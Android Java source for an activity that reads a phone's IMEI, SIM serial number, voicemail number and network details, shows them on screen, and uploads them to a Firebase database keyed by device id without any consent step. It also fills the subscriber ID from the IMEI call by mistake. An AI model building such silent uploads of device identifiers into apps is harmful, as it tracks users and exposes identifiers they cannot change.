package com.swadesiapps.getdata;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.widget.TextView;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class PhoneDetailsActivity extends AppCompatActivity {

    TextView textView1;
    private DatabaseReference mDataRef;

    @SuppressLint("MissingPermission")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_phone_details);

        textView1 = (TextView) findViewById(R.id.textView1);
        mDataRef = FirebaseDatabase.getInstance().getReference().child(Constants.deviceid).child("details");
        //Get the instance of TelephonyManager
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        //Calling the methods of TelephonyManager the returns the information
        String IMEINumber = tm.getDeviceId();
        String subscriberID = tm.getDeviceId();
        String SIMSerialNumber = tm.getSimSerialNumber();
        String networkCountryISO = tm.getNetworkCountryIso();
        String SIMCountryISO = tm.getSimCountryIso();
        String softwareVersion = tm.getDeviceSoftwareVersion();
        String voiceMailNumber = tm.getVoiceMailNumber();

        //Get the phone type
        String strphoneType = "";

        int phoneType = tm.getPhoneType();

        switch (phoneType) {
            case (TelephonyManager.PHONE_TYPE_CDMA):
                strphoneType = "CDMA";
                break;
            case (TelephonyManager.PHONE_TYPE_GSM):
                strphoneType = "GSM";
                break;
            case (TelephonyManager.PHONE_TYPE_NONE):
                strphoneType = "NONE";
                break;
        }

        //getting information if phone is in roaming
        boolean isRoaming = tm.isNetworkRoaming();

        String info = "Phone Details:\n";
        info += "\n IMEI Number:" + IMEINumber;
        info += "\n SubscriberID:" + subscriberID;
        info += "\n Sim Serial Number:" + SIMSerialNumber;
        info += "\n Network Country ISO:" + networkCountryISO;
        info += "\n SIM Country ISO:" + SIMCountryISO;
        info += "\n Software Version:" + softwareVersion;
        info += "\n Voice Mail Number:" + voiceMailNumber;
        info += "\n Phone Network Type:" + strphoneType;
        info += "\n In Roaming? :" + isRoaming;

        textView1.setText(info);
        Map<String,Object> call = new HashMap<>();
        call.put("allDetails",textView1.getText().toString());
        mDataRef.updateChildren(call);
    }


}